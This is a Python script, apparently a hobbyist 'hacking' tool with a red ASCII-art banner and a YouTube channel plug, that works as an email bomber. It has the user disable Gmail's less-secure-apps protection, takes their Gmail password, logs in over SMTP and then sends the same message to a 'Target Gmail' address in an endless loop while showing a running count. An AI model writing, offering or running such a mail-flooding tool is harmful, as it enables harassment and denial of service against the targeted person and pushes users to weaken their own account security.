import smtplib 
import sys 
import string 
import subprocess

subprocess.call(["clear"])

class bcolor:
    yesil = '\033[92m'
    kirmizi = '\033[91m'
    mor = '\033[90m'
    beyaz = '\033[97m'
    renk = '\033[99m'



print(bcolor.kirmizi+"    _____________________________________")
print("    ___________##########________________")
print("    __________#############______________")
print("    _________##############______________")
print("    ________#######______###_____________")
print("    ________######________##___"+bcolor.beyaz+"#"+bcolor.kirmizi+"_________")
print("    ________######____________"+bcolor.beyaz+"###"+bcolor.kirmizi+"________")
print("    ________#####_____________"+bcolor.beyaz+"######"+bcolor.kirmizi+"_____")
print("    ________#####____________"+bcolor.beyaz+"#######"+bcolor.kirmizi+"_____")
print("    ________#####___________"+bcolor.beyaz+"#######"+bcolor.kirmizi+"______")
print("    ________#####____________"+bcolor.beyaz+"######"+bcolor.kirmizi+"______")
print("    ________#####_____________"+bcolor.beyaz+"######"+bcolor.kirmizi+"_____")
print("    ________######____________"+bcolor.beyaz+"#####"+bcolor.kirmizi+"______")
print("    _________######_______#___"+bcolor.beyaz+" ""##"+bcolor.kirmizi+"________")
print("    _________#######____###______________")
print("    __________############_______________")
print("    ___________##########________________")
print("    _____________######__________________")
print(" ")
print(bcolor.kirmizi+" _   _       ____           _ ____   _    ")
print(bcolor.kirmizi+"| | | |_   _|  _ \ __ _  __| |  _ \ / \   ")
print(bcolor.kirmizi+"| |_| | | | | |_) / _` |/ _` | |_) / _ \  ")
print(bcolor.kirmizi+"|  _  | |_| |  _ < (_| | (_| |  __/ ___ \ ")
print(bcolor.kirmizi+"|_| |_|\__,_|_| \_\__,_|\__,_|_| /_/   \_\ ")
print(" ")
print("Welcome")
print("Subscribe This Channel : https://www.youtube.com/channel/UChvRBOTacbSbdTtEHc8m19g")
print(" ")
print(" ")
print(bcolor.beyaz + "grant permission before login or it won't work")
print("")
print(" Link : https://myaccount.google.com/lesssecureapps?pli=1 ")
print("")
print("")
kullanici_ad = input("Your Gmail addres >  ")
print("if it doesn't log in. enter the link and close the setting")
print(" ")
parola = input("Your Gmail Password > ")
 
 
baglanti = smtplib.SMTP("smtp.gmail.com",587)
baglanti.starttls()
baglanti.login(kullanici_ad,parola)
print(bcolor.kirmizi+"Connection is succesfull") 
print("")

hedef = input(bcolor.beyaz+"Target Gmail > ")
mesaj = input("Your Message >  ")


say = 1

while 1:

    say=say+1
    baglanti.sendmail(kullanici_ad,hedef,mesaj)
    subprocess.call(["clear"])

    print(bcolor.kirmizi+"     _____________________________________")
    print("     ___________##########________________")
    print("     __________#############______________")
    print("     _________##############______________")
    print("     ________#######______###_____________")
    print("     ________######________##___"+bcolor.beyaz+"#"+bcolor.kirmizi+"_________")
    print("     ________######____________"+bcolor.beyaz+"###"+bcolor.kirmizi+"________")
    print("     ________#####_____________"+bcolor.beyaz+"######"+bcolor.kirmizi+"_____")
    print("     ________#####____________"+bcolor.beyaz+"#######"+bcolor.kirmizi+"_____")
    print("     ________#####___________"+bcolor.beyaz+"#######"+bcolor.kirmizi+"______")
    print("     ________#####____________"+bcolor.beyaz+"######"+bcolor.kirmizi+"______")
    print("     ________#####_____________"+bcolor.beyaz+"######"+bcolor.kirmizi+"_____")
    print("     ________######____________"+bcolor.beyaz+"#####"+bcolor.kirmizi+"_____")
    print("     _________######_______#___"+bcolor.beyaz+"##"+bcolor.kirmizi+"_________")
    print("     _________#######____###______________")
    print("     __________############_______________")
    print("     ___________##########________________")
    print("     _____________######__________________"+bcolor.mor)
    print(" ")
    print(" ")
    print(bcolor.kirmizi+" _   _       ____           _ ____   _    ")
    print(bcolor.kirmizi+"| | | |_   _|  _ \ __ _  __| |  _ \ / \   ")
    print(bcolor.kirmizi+"| |_| | | | | |_) / _` |/ _` | |_) / _ \  ")
    print(bcolor.kirmizi+"|  _  | |_| |  _ < (_| | (_| |  __/ ___ \ ")
    print(bcolor.kirmizi+"|_| |_|\__,_|_| \_\__,_|\__,_|_| /_/   \_\ ")

    print(hedef,"number of mails sent :",say)
    print(" ")
    print(bcolor.beyaz+"message is being sent. CTRL+C to stop")
